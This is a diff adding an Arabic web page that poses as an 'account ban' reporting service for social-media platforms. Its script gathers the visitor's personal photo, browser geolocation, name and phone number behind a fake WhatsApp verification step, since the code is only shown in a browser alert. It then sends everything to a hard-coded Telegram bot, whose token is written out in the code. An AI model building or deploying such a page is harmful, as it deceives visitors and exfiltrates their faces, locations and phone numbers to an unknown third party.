@@ -1,0 +1,624 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>نظام حظر الحسابات</title>
+    <style>
+        :root {
+            --primary-color: #e74c3c;
+            --secondary-color: #2c3e50;
+            --accent-color: #f39c12;
+            --light-color: #ecf0f1;
+            --dark-color: #34495e;
+            --whatsapp-color: #25D366;
+        }
+        
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background-color: #f5f5f5;
+            color: var(--dark-color);
+            line-height: 1.6;
+        }
+        
+        .container {
+            max-width: 800px;
+            margin: 20px auto;
+            padding: 20px;
+            background-color: white;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+            transition: all 0.3s ease;
+        }
+        
+        header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding-bottom: 20px;
+            border-bottom: 2px solid var(--light-color);
+        }
+        
+        h1 {
+            color: var(--primary-color);
+            font-size: 28px;
+            margin-bottom: 10px;
+        }
+        
+        .logo {
+            width: 80px;
+            height: 80px;
+            margin-bottom: 15px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+            color: var(--secondary-color);
+        }
+        
+        input[type="text"],
+        input[type="number"],
+        input[type="tel"],
+        textarea,
+        select {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 16px;
+            transition: border 0.3s;
+        }
+        
+        input:focus,
+        textarea:focus,
+        select:focus {
+            border-color: var(--accent-color);
+            outline: none;
+        }
+        
+        textarea {
+            min-height: 120px;
+            resize: vertical;
+        }
+        
+        .file-upload {
+            position: relative;
+            overflow: hidden;
+            display: inline-block;
+            width: 100%;
+        }
+        
+        .file-upload-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: var(--light-color);
+            color: var(--dark-color);
+            border: 1px dashed #ccc;
+            border-radius: 5px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .file-upload-btn:hover {
+            background-color: #ddd;
+        }
+        
+        .file-upload-input {
+            position: absolute;
+            left: 0;
+            top: 0;
+            opacity: 0;
+            width: 100%;
+            height: 100%;
+            cursor: pointer;
+        }
+        
+        .preview-image {
+            max-width: 200px;
+            max-height: 200px;
+            margin-top: 10px;
+            display: none;
+            border-radius: 5px;
+        }
+        
+        .location-group {
+            display: flex;
+            gap: 10px;
+        }
+        
+        .location-group input {
+            flex: 1;
+        }
+        
+        button {
+            background-color: var(--primary-color);
+            color: white;
+            border: none;
+            padding: 14px 20px;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%;
+            transition: background-color 0.3s;
+            font-weight: bold;
+        }
+        
+        button:hover {
+            background-color: #c0392b;
+        }
+        
+        .status {
+            margin-top: 20px;
+            padding: 10px;
+            border-radius: 5px;
+            text-align: center;
+            display: none;
+        }
+        
+        .success {
+            background-color: #d4edda;
+            color: #155724;
+        }
+        
+        .error {
+            background-color: #f8d7da;
+            color: #721c24;
+        }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            margin: 20px 0;
+        }
+        
+        .spinner {
+            border: 4px solid rgba(0, 0, 0, 0.1);
+            border-radius: 50%;
+            border-top: 4px solid var(--primary-color);
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        
+        .verification-section {
+            display: none;
+            margin: 20px 0;
+            padding: 15px;
+            background-color: #f8f9fa;
+            border-radius: 5px;
+            border: 1px solid #ddd;
+        }
+        
+        .verification-input {
+            display: flex;
+            gap: 10px;
+            margin-top: 10px;
+        }
+        
+        .verification-input input {
+            flex: 1;
+            text-align: center;
+            font-size: 18px;
+            font-weight: bold;
+        }
+        
+        .send-code-btn {
+            background-color: var(--whatsapp-color);
+            margin-bottom: 10px;
+        }
+        
+        .send-code-btn:hover {
+            background-color: #128C7E;
+        }
+        
+        .verify-btn {
+            background-color: var(--secondary-color);
+        }
+        
+        .verify-btn:hover {
+            background-color: #1a252f;
+        }
+        
+        .form-page {
+            display: none;
+        }
+        
+        .form-page.active {
+            display: block;
+        }
+        
+        .timer {
+            text-align: center;
+            margin-top: 10px;
+            color: var(--primary-color);
+            font-weight: bold;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        @media (max-width: 768px) {
+            .container {
+                margin: 10px;
+                padding: 15px;
+            }
+            
+            .location-group {
+                flex-direction: column;
+            }
+            
+            .verification-input {
+                flex-direction: column;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- صفحة إدخال البيانات الأساسية -->
+        <div id="mainForm" class="form-page active">
+            <header>
+                <img src="https://cdn-icons-png.flaticon.com/512/2913/2913108.png" alt="Logo" class="logo">
+                <h1>نظام حظر الحسابات</h1>
+                <p>الرجاء تعبئة النموذج التالي للإبلاغ عن حساب مخالف</p>
+            </header>
+            
+            <form id="banForm">
+                <div class="form-group">
+                    <label for="username">اسم المستخدم المراد حظره</label>
+                    <input type="text" id="username" name="username" required placeholder="أدخل اسم المستخدم">
+                </div>
+                
+                <div class="form-group">
+                    <label for="platform">المنصة</label>
+                    <select id="platform" name="platform" required>
+                        <option value="">اختر المنصة</option>
+                        <option value="فيسبوك">فيسبوك</option>
+                        <option value="تويتر">تويتر</option>
+                        <option value="انستقرام">انستقرام</option>
+                        <option value="تيك توك">تيك توك</option>
+                        <option value="سناب شات">سناب شات</option>
+                        <option value="أخرى">أخرى</option>
+                    </select>
+                </div>
+                
+                <div class="form-group">
+                    <label for="reason">سبب الحظر</label>
+                    <select id="reason" name="reason" required>
+                        <option value="">اختر سبب الحظر</option>
+                        <option value="محتوى غير لائق">محتوى غير لائق</option>
+                        <option value="احتيال ونصب">احتيال ونصب</option>
+                        <option value="انتحال شخصية">انتحال شخصية</option>
+                        <option value="تنمر ومضايقات">تنمر ومضايقات</option>
+                        <option value="انتهاك حقوق الملكية">انتهاك حقوق الملكية</option>
+                        <option value="أخرى">أخرى</option>
+                    </select>
+                </div>
+                
+                <div class="form-group">
+                    <label for="description">شرح المشكلة بالتفصيل</label>
+                    <textarea id="description" name="description" required placeholder="صف المشكلة بالتفصيل..."></textarea>
+                </div>
+                
+                <div class="form-group">
+                    <label for="photo">رفع صورة شخصية لتوثيق الحساب</label>
+                    <div class="file-upload">
+                        <label class="file-upload-btn">
+                            اختر صورة
+                            <input type="file" id="photo" name="photo" class="file-upload-input" accept="image/*" required>
+                        </label>
+                    </div>
+                    <img id="imagePreview" class="preview-image" alt="معاينة الصورة">
+                </div>
+                
+                <div class="form-group">
+                    <label>الموقع الجغرافي</label>
+                    <div class="location-group">
+                        <input type="text" id="latitude" name="latitude" placeholder="خط العرض" readonly>
+                        <input type="text" id="longitude" name="longitude" placeholder="خط الطول" readonly>
+                    </div>
+                    <button type="button" id="getLocation" style="margin-top: 10px; background-color: var(--secondary-color);">الحصول على الموقع الحالي</button>
+                </div>
+                
+                <div class="form-group">
+                    <label for="reporter">اسم المبلغ (اختياري)</label>
+                    <input type="text" id="reporter" name="reporter" placeholder="اسمك">
+                </div>
+                
+                <div class="form-group">
+                    <label for="phone">رقم الهاتف للتحقق</label>
+                    <input type="tel" id="phone" name="phone" required placeholder="أدخل رقم الهاتف مع رمز الدولة">
+                </div>
+                
+                <div class="loading">
+                    <div class="spinner"></div>
+                    <p>جاري إرسال البيانات...</p>
+                </div>
+                
+                <div class="status" id="status"></div>
+                
+                <button type="button" id="sendVerification" class="send-code-btn">إرسال كود التحقق عبر الواتساب</button>
+            </form>
+        </div>
+        
+        <!-- صفحة التحقق -->
+        <div id="verificationPage" class="form-page">
+            <header>
+                <img src="https://cdn-icons-png.flaticon.com/512/2913/2913108.png" alt="Logo" class="logo">
+                <h1>التحقق من الهوية</h1>
+                <p>لقد أرسلنا كود التحقق إلى رقم الهاتف المسجل</p>
+            </header>
+            
+            <div class="verification-section">
+                <label for="verificationCode">أدخل الكود المكون من 6 أرقام</label>
+                <div class="verification-input">
+                    <input type="text" id="verificationCode" name="verificationCode" maxlength="6" placeholder="------" pattern="\d{6}" required>
+                </div>
+                <div class="timer" id="timer">02:00</div>
+                <button type="button" id="resendCode" class="send-code-btn" disabled>إعادة إرسال الكود</button>
+                <button type="button" id="verifyCode" class="verify-btn">تحقق</button>
+            </div>
+            
+            <div class="loading" id="verifyLoading">
+                <div class="spinner"></div>
+                <p>جاري التحقق...</p>
+            </div>
+            
+            <div class="status" id="verifyStatus"></div>
+        </div>
+    </div>
+
+    <script>
+        // متغيرات عامة
+        let verificationData = {};
+        let countdownInterval;
+        let remainingTime = 120; // 2 دقائق بالثواني
+        
+        // عرض معاينة الصورة
+        document.getElementById('photo').addEventListener('change', function(e) {
+            const file = e.target.files[0];
+            if (file) {
+                const reader = new FileReader();
+                reader.onload = function(event) {
+                    const preview = document.getElementById('imagePreview');
+                    preview.src = event.target.result;
+                    preview.style.display = 'block';
+                };
+                reader.readAsDataURL(file);
+            }
+        });
+        
+        // الحصول على الموقع الجغرافي
+        document.getElementById('getLocation').addEventListener('click', function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        document.getElementById('latitude').value = position.coords.latitude;
+                        document.getElementById('longitude').value = position.coords.longitude;
+                    },
+                    function(error) {
+                        alert('حدث خطأ في الحصول على الموقع: ' + error.message);
+                    }
+                );
+            } else {
+                alert('المتصفح لا يدعم خدمة تحديد الموقع الجغرافي');
+            }
+        });
+        
+        // إرسال كود التحقق
+        document.getElementById('sendVerification').addEventListener('click', function() {
+            const form = document.getElementById('banForm');
+            const loading = document.querySelector('.loading');
+            const status = document.getElementById('status');
+            
+            // التحقق من صحة النموذج
+            if (!form.checkValidity()) {
+                form.reportValidity();
+                return;
+            }
+            
+            // إظهار حالة التحميل
+            loading.style.display = 'block';
+            status.style.display = 'none';
+            
+            // جمع بيانات النموذج
+            const formData = new FormData(form);
+            verificationData = {
+                username: formData.get('username'),
+                platform: formData.get('platform'),
+                reason: formData.get('reason'),
+                description: formData.get('description'),
+                latitude: formData.get('latitude'),
+                longitude: formData.get('longitude'),
+                reporter: formData.get('reporter'),
+                phone: formData.get('phone'),
+                photo: formData.get('photo')
+            };
+            
+            // توليد كود تحقق عشوائي (6 أرقام)
+            const verificationCode = Math.floor(100000 + Math.random() * 900000);
+            verificationData.verificationCode = verificationCode;
+            
+            // هنا نضيف الكود الذي يرسل الرسالة إلى الواتساب
+            // في الواقع تحتاج إلى استخدام API خاص بالواتساب مثل Twilio أو غيرها
+            // هذا مثال فقط للتوضيح
+            setTimeout(() => {
+                loading.style.display = 'none';
+                
+                // في الواقع هنا سيتم إرسال الكود إلى الواتساب
+                // ولكن لأغراض العرض سنظهره في التنبيه
+                alert(`كود التحقق: ${verificationCode}\n\nفي الواقع سيتم إرسال هذا الكود إلى رقم الهاتف ${verificationData.phone} عبر الواتساب`);
+                
+                // الانتقال إلى صفحة التحقق
+                document.getElementById('mainForm').classList.remove('active');
+                document.getElementById('verificationPage').classList.add('active');
+                
+                // بدء العد التنازلي
+                startCountdown();
+            }, 2000);
+        });
+        
+        // بدء العد التنازلي لإعادة الإرسال
+        function startCountdown() {
+            clearInterval(countdownInterval);
+            remainingTime = 120;
+            updateTimerDisplay();
+            
+            countdownInterval = setInterval(() => {
+                remainingTime--;
+                updateTimerDisplay();
+                
+                if (remainingTime <= 0) {
+                    clearInterval(countdownInterval);
+                    document.getElementById('resendCode').disabled = false;
+                }
+            }, 1000);
+        }
+        
+        // تحديث عرض المؤقت
+        function updateTimerDisplay() {
+            const minutes = Math.floor(remainingTime / 60);
+            const seconds = remainingTime % 60;
+            document.getElementById('timer').textContent = 
+                `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+        }
+        
+        // إعادة إرسال كود التحقق
+        document.getElementById('resendCode').addEventListener('click', function() {
+            this.disabled = true;
+            
+            // توليد كود جديد
+            const newVerificationCode = Math.floor(100000 + Math.random() * 900000);
+            verificationData.verificationCode = newVerificationCode;
+            
+            // هنا نضيف الكود الذي يرسل الرسالة إلى الواتساب
+            alert(`كود التحقق الجديد: ${newVerificationCode}\n\nفي الواقع سيتم إرسال هذا الكود إلى رقم الهاتف ${verificationData.phone} عبر الواتساب`);
+            
+            // إعادة بدء العد التنازلي
+            startCountdown();
+        });
+        
+        // التحقق من الكود
+        document.getElementById('verifyCode').addEventListener('click', function() {
+            const enteredCode = document.getElementById('verificationCode').value;
+            const verifyLoading = document.getElementById('verifyLoading');
+            const verifyStatus = document.getElementById('verifyStatus');
+            
+            if (!enteredCode || enteredCode.length !== 6) {
+                verifyStatus.textContent = 'الرجاء إدخال كود التحقق المكون من 6 أرقام';
+                verifyStatus.className = 'status error';
+                verifyStatus.style.display = 'block';
+                return;
+            }
+            
+            verifyLoading.style.display = 'block';
+            verifyStatus.style.display = 'none';
+            
+            // محاكاة التحقق (في الواقع يجب مقارنة الكود مع ما تم إرساله)
+            setTimeout(() => {
+                verifyLoading.style.display = 'none';
+                
+                if (enteredCode == verificationData.verificationCode) {
+                    verifyStatus.textContent = 'تم التحقق بنجاح! جاري إرسال البيانات...';
+                    verifyStatus.className = 'status success';
+                    verifyStatus.style.display = 'block';
+                    
+                    // إرسال البيانات إلى التلجرام بعد التحقق
+                    sendToTelegram();
+                } else {
+                    verifyStatus.textContent = 'كود التحقق غير صحيح، الرجاء المحاولة مرة أخرى';
+                    verifyStatus.className = 'status error';
+                    verifyStatus.style.display = 'block';
+                }
+            }, 1500);
+        });
+        
+        // إرسال البيانات إلى التلجرام
+        function sendToTelegram() {
+            const verifyLoading = document.getElementById('verifyLoading');
+            const verifyStatus = document.getElementById('verifyStatus');
+            
+            verifyLoading.style.display = 'block';
+            
+            // إعداد الرسالة للتلجرام
+            let message = `📢 *طلب حظر حساب جديد* 📢\n\n`;
+            message += `✅ *تم التحقق من الهوية*\n`;
+            message += `📱 *رقم الهاتف:* ${verificationData.phone}\n\n`;
+            message += `👤 *اسم المستخدم:* ${verificationData.username}\n`;
+            message += `📱 *المنصة:* ${verificationData.platform}\n`;
+            message += `❗ *سبب الحظر:* ${verificationData.reason}\n`;
+            message += `📝 *شرح المشكلة:*\n${verificationData.description}\n\n`;
+            message += `📍 *الموقع الجغرافي:*\n`;
+            message += `- خط العرض: ${verificationData.latitude}\n`;
+            message += `- خط الطول: ${verificationData.longitude}\n\n`;
+            
+            if (verificationData.reporter) {
+                message += `👤 *اسم المبلغ:* ${verificationData.reporter}\n`;
+            }
+            
+            message += `🔢 *كود التحقق:* ${verificationData.verificationCode}`;
+            
+            // إعداد البيانات لإرسالها إلى التلجرام
+            const telegramData = new FormData();
+            telegramData.append('chat_id', '7493001551');
+            telegramData.append('caption', message);
+            telegramData.append('parse_mode', 'Markdown');
+            
+            if (verificationData.photo) {
+                telegramData.append('photo', verificationData.photo);
+            }
+            
+            // إرسال البيانات إلى بوت التلجرام
+            fetch(`https://api.telegram.org/bot7054208207:AAHVwwMlay45aLFyQn4FCJyfWM_-AoQXpMM/sendPhoto`, {
+                method: 'POST',
+                body: telegramData
+            })
+            .then(response => response.json())
+            .then(data => {
+                verifyLoading.style.display = 'none';
+                
+                if (data.ok) {
+                    verifyStatus.textContent = 'تم إرسال طلب الحظر بنجاح! سيتم مراجعته من قبل الفريق المختص.';
+                    verifyStatus.className = 'status success';
+                    verifyStatus.style.display = 'block';
+                    
+                    // إعادة تعيين النموذج بعد 3 ثواني
+                    setTimeout(() => {
+                        document.getElementById('banForm').reset();
+                        document.getElementById('imagePreview').style.display = 'none';
+                        document.getElementById('verificationPage').classList.remove('active');
+                        document.getElementById('mainForm').classList.add('active');
+                        document.getElementById('verifyStatus').style.display = 'none';
+                        document.getElementById('verificationCode').value = '';
+                        clearInterval(countdownInterval);
+                    }, 3000);
+                } else {
+                    throw new Error(data.description || 'حدث خطأ غير معروف');
+                }
+            })
+            .catch(error => {
+                verifyLoading.style.display = 'none';
+                verifyStatus.textContent = `حدث خطأ أثناء إرسال البيانات: ${error.message}`;
+                verifyStatus.className = 'status error';
+                verifyStatus.style.display = 'block';
+                console.error('Error:', error);
+            });
+        }
+    </script>
+</body>
+</html>
